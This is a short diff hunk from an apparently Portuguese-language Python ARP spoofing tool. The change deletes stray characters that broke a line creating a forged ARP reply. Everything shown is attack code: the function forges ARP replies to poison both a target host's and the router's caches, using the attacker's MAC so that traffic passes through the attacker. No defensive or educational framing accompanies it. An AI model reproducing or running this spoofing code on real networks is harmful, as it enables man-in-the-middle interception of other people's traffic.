@@ -105,7 +105,7 @@ def arp_spoof(interface, alvo_ip, roteador_ip):
     print(f"[INFO] Roteador IP: {roteador_ip}, MAC: {roteador_mac}")
 
     # Pacotes para enviar
-    pacote_para_alvo = criar_pacote_arp(atacante_mac, roteador_ip, alvo_mac, alvo_ip, 2) byLLi0Ro66
+    pacote_para_alvo = criar_pacote_arp(atacante_mac, roteador_ip, alvo_mac, alvo_ip, 2)
     pacote_para_roteador = criar_pacote_arp(atacante_mac, alvo_ip, roteador_mac, roteador_ip, 2)
 
     try:
